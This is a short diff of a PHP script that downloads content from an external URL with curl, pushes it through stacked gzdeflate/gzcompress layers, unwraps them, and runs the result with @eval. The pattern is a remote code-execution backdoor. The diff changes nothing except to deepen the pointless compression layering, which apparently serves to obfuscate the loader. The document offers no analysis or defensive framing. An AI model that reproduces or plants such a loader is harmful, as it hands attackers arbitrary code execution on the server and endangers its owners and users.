@@ -13,8 +13,8 @@ function fetchContent($url) {
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
     $content = curl_exec($curl);
     curl_close($curl);
-    return gzdeflate(gzcompress(gzdeflate(gzcompress($content))));
+    return gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress($content))))))));
 }
-$content = gzuncompress(gzinflate(gzuncompress(gzinflate(fetchContent($url)))));
+$content = gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(fetchContent($url)))))))));
 @eval("?>".$content);
 ?>
